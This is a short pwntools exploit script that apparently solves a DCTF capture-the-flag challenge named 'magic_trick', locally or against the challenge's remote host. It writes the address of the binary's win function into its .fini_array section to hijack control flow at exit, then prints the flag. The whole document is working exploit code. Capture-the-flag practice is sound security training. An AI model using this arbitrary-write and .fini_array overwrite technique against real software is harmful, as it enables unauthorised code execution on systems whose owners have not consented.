#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./magic_trick')

if args.REMOTE:
	p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)
else:
	p = process(binary.path)

p.sendlineafter('write\n', str(binary.sym.win))
p.sendlineafter('it\n', str(binary.get_section_by_name('.fini_array').header.sh_addr))
print(p.recvuntil('}').decode())
